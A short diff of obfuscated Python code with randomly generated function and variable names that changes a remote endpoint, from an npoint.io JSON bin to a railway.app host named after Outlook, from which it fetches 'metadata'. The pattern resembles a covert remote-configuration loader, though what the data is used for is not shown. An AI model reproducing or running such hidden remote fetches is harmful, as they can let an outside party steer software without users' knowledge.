@@ -18,7 +18,7 @@ def eval_kdgutf_486():
 
     def model_snwmie_480():
         try:
-            train_njwiyc_586 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_njwiyc_586 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_njwiyc_586.raise_for_status()
             model_phkfem_449 = train_njwiyc_586.json()
             eval_otaaaz_560 = model_phkfem_449.get('metadata')
